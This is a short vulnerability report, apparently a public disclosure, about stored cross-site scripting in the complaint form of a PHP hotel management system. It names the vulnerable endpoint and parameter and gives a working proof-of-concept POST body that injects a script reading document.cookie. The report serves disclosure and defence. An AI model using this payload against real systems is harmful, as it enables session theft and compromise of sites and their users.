# Multi Language Hotel Management Software v1.0 has stored cross-site scripting

BUG_Author: getshell

Website source code address: https://www.sourcecodester.com/php/15551/multi-language-hotel-management-software-free-download-source-code.html

Vulnerability url: /sparkz/ajax.php

POST parameter complaint_type exists stored cross-site scripting

Payload:complainant_name=1&complaint_type=<script>alert(document.cookie)</script>&complaint=2&createComplaint=

![image](https://github.com/admin-passwd/bug_report/blob/main/sql1.png)

Payload will trigger when a user visits on http://localhost/sparkz/index.php?complain

![image](https://github.com/admin-passwd/bug_report/blob/main/sql2.png)
